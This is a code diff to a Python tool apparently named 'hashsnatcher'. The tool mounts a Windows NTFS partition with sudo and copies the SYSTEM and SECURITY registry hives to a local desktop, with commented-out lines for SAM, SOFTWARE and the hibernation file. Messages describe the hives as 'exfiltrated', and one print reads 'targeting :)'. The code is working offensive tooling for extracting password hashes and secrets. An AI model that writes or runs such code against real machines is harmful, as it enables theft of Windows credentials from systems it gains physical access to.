@@ -21,7 +21,7 @@ class Drive:
     def get_fs(self):
         return self.fs
     def is_mounted(self):
-        proc = subprocess.Popen("sudo mount | column -t", stdout=subprocess.PIPE, shell=True)
+        proc = subprocess.Popen("sudo mount", stdout=subprocess.PIPE, shell=True)
         (mounted_drives, err) = proc.communicate()
         mounted_drives = mounted_drives.decode('utf-8')     
         if self.get_source() in mounted_drives:
@@ -49,6 +49,13 @@ def locate_winfs(drives):
 def mount_drive(drive):
     #should refactor to accept input for /media/drivetype to exploit different file systems
     #got rid of /etc/services fromm mount command. Don't think I need it
+    try:
+        os.mkdir('/media/windows')
+    except PermissionError:
+        print('was unable to create mountpoint. Please run hashsnatcher as root.')
+        sys.exit()
+    except FileExistsError:
+        print('already have mounting point')
     subprocess.Popen("sudo mount -t ntfs-3g -o nls=utf8 {} /media/windows".format(drive.get_source()), shell=True)
     time.sleep(1)
 
@@ -59,20 +66,13 @@ def copy_winpayload():
 
     #^^^ dumb idea probably. A good idea wouldl be to refactor this and get rid of the shit hardcoded values for copy dest!
     dirss = os.listdir('/media/windows')
-    print(dirss)
     
     for dirs in dirss:
         if "Windows" in str(dirs):
-            print(type(dirs))
+            print('targeting :)')
     # shutil.copyfile('/media/windows/hyberfil.sys*', '/home/zigmo/Desktop/hyberfil.sys')
-    # time.sleep(10)
-
-   
+    # time.sleep(10) 
     try:
-
-        print(os.listdir('/media/windows/Windows/System32/config/'))
-        print(os.path.isfile('/media/windows/Windows/System32/config/system'))
-
         # shutil.copyfile('/media/windows/Windows/System32/config/sam', '/home/galactic_t0ast/Desktop/SAM')
         shutil.copyfile('/media/windows/Windows/System32/config/system', '/home/galactic_t0ast/Desktop/SYSTEM')
         shutil.copyfile('/media/windows/Windows/System32/config/security', '/home/galactic_t0ast/Desktop/SECURITY')
@@ -85,7 +85,7 @@ def copy_winpayload():
         #shutil.copyfile('/media/windows/Windows/System32/config/SOFTWARE', '/home/zigmo/Desktop/SOFTWARE')
         
         # subprocess.Popen('sudo cp /media/windows/hyberfil.sys /home/galactic_t0ast/Desktop/hyberfil.sys', shell=True)
-        print('hybernation file has been exfiltrated to /home/zigmo/Desktop/hyberfil.sys\nSYSTEM SAM SECURITY and SOFTWARE registry hives have been succesfully exfiltrated to /home/zigmo/Desktop')
+        # print('hybernation file has been exfiltrated to /home/galactic_t0ast/Desktop/hyberfil.sys\nSYSTEM SAM SECURITY and SOFTWARE registry hives have been succesfully exfiltrated to /home/zigmo/Desktop')
     except FileNotFoundError as e:
         print(e.strerror) 
         print(e)
